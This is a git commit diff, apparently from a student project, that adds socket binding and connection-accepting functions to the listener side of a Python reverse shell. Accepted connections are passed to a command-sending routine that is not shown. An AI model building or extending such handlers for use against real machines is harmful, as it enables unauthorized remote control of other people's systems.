b28b027024ecd0a7ef2a12b290cb2c942e220dd8
Michael Swisher <Michael.V.Swisher@colorado.edu>
2015-12-22 23:50:57 -0700

    Added socket binding to server stuff on reverse shell

--- Reverse Shells/server.py
+++ Reverse Shells/server.py
@@ -13,4 +13,22 @@ def socket_create():
 	except socket.error as msg: # Saves error into variable msg
 		print("Socket creation error: " + str(msg))
 
+# Bind socket ot port and wait for connection from client
+def socket_bind():
+	try:
+		global host
+		global port
+		global s
+		print("Binding socket to port: " + str(port))
+		s.bind((host, port))
+		s.listen(5) # 5 is the number of bad connections it'll receive before it'll start refusing connections
+	except socket.error as msg:
+		print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
+		socket_bind()
 
+# Establish connection with client from listening socket
+def socket_accept():
+	conn, address = s.accept() # s.accept() accepts new connections
+	print("Connection has been established | " + "IP " +  address[0] + " | Port " + str(address[1]))
+	send_commands(conn)
+	conn.close()
